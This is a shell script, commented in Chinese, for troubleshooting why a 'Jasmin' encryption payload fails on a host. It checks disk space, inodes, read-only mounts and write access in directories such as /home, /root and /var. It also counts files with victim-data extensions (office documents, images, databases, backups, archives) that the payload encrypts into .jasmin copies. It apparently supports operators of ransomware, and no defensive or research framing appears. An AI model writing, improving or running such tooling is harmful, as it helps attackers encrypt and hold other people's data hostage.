#!/bin/sh
# Jasmin 加密环境诊断 —— 一键定位「加密 0/N 全部失败」的原因
# 用法: sh jasmin_diagnose.sh [目标目录，默认 /tmp /home /root /var /opt /srv]
# 加密需要为每个被加密文件额外生成一个等大的 .jasmin，
# 因此目标目录所在分区必须拥有 >= 待加密数据总量的空闲空间与 inode。

DIRS="$*"
[ -n "$DIRS" ] || DIRS="/tmp /home /root /var /opt /srv"

echo "════════ Jasmin Encryption Environment Diagnostic ════════"
echo "Time: $(date 2>/dev/null)"
echo "User: $(id 2>/dev/null)"
echo ""

# ── 1. 各分区空间与 inode ──
echo "──── 1. Space / inode ────"
SEEN=""
for d in $DIRS; do
    [ -d "$d" ] || continue
    T=$(df -P "$d" 2>/dev/null | awk 'NR==2{print $6}')
    case " $SEEN " in *" $T "*) continue;; esac
    SEEN="$SEEN $T"
    echo "Filesystem: $T   (from $d)"
    df -h "$T" 2>/dev/null | awk 'NR==1{print "  "$0} NR==2{print "  "$0}'
    df -i "$T" 2>/dev/null | awk 'NR==2{printf "  inode: used %s / total %s (%s)\n",$3,$2,$5}'
    # 阈值判断
    avail=$(df -P "$d" 2>/dev/null | awk 'NR==2{print $4}')
    if [ -n "$avail" ] && [ "$avail" -lt 1048576 ] 2>/dev/null; then
        echo "  * WARNING: less than 1GB free - encryption will fail extensively"
    fi
    iuse=$(df -i "$d" 2>/dev/null | awk 'NR==2{print $5}' | tr -d '%')
    if [ -n "$iuse" ] && [ "$iuse" -gt 90 ] 2>/dev/null; then
        echo "  * WARNING: inode usage $iuse% - cannot allocate inodes for new files"
    fi
    echo ""
done

# ── 2. 挂载参数（只读检测） ──
echo "──── 2. Mount options (read-only?) ────"
mount 2>/dev/null | grep -E "^/|overlay|tmpfs" | while IFS= read -r l; do
    case "$l" in
        *" ro,"*|*"(ro"*) echo "  * READ-ONLY: $l";;
    esac
done
echo "  (no * above means no read-only mount)"
echo ""

# ── 3. 就地可写实测 ──
echo "──── 3. In-place write test (critical) ────"
for d in $DIRS; do
    [ -d "$d" ] || continue
    f="$d/.__jasmin_wtest_$$"
    if (echo test > "$f") 2>/dev/null; then
        if [ "$(cat "$f" 2>/dev/null)" = "test" ]; then
            echo "  OK $d create + write works"
        else
            echo "  * $d file created but content read-back mismatch (read-only layer / overlay fs?)"
        fi
        rm -f "$f" 2>/dev/null
    else
        echo "  * $d cannot create files (read-only / disk full / inode full / permission denied)"
    fi
done
echo ""

# ── 4. 大文件写入实测(1MB) ──
echo "──── 4. 1MB write test ────"
for d in $DIRS; do
    [ -d "$d" ] || continue
    f="$d/.__jasmin_bigtest_$$"
    if dd if=/dev/zero of="$f" bs=1024 count=1024 2>/dev/null; then
        echo "  OK $d can write 1MB"
    else
        echo "  * $d cannot write 1MB - out of space or quota exceeded"
    fi
    rm -f "$f" 2>/dev/null
done
echo ""

# ── 5. 权限与配额 ──
echo "──── 5. Permissions / quota / resource limits ────"
echo "  ulimit -n (open files): $(ulimit -n 2>/dev/null)"
if command -v quota >/dev/null 2>&1; then
    quota -s 2>/dev/null | head -5 || echo "  (no quota info)"
else
    echo "  (no quota command on this system)"
fi
echo ""

# ── 6. 目标数据量 ──
echo "──── 6. Target data size (determines extra space needed) ────"
# 载荷只加密白名单扩展名内的文件，所以 inode 需求要按白名单统计。
# 此前用 `find -type f | wc -l` 统计【全部】文件并宣称"需要 n 个 inode"，
# 会把图片/源码/缓存等永远不会被加密的文件也算进去，显著高估、误导容量规划。
EXTS_RE='^(ppt|pptx|doc|docx|xls|xlsx|pdf|txt|csv|rtf|odt|ods|md|jpg|jpeg|png|gif|bmp|tif|tiff|heic|webp|raw|mp3|flac|wav|m4a|mp4|mov|avi|mkv|sql|bak|html|php|py|java|json|xml|zip|rar|7z)$'
for d in $DIRS; do
    [ -d "$d" ] || continue
    tot=$(find "$d" -type f 2>/dev/null | wc -l)
    n=$(find "$d" -type f 2>/dev/null | awk -F. -v re="$EXTS_RE" 'tolower($NF) ~ re' | wc -l)
    s=$(du -sh "$d" 2>/dev/null | awk '{print $1}')
    echo "  $d: $tot files total ($n match encryption targets), $s total"
    echo "      -> encryption needs about $s free space and ~$n inodes (only target extensions are encrypted)"
done
echo ""

echo "════════ Diagnostic complete ════════"
echo "If any * appeared above, that is why encryption fails on a large scale."
echo "If no * appeared but encryption still fails, regenerate the payload - the current build prints the real errno and reason."
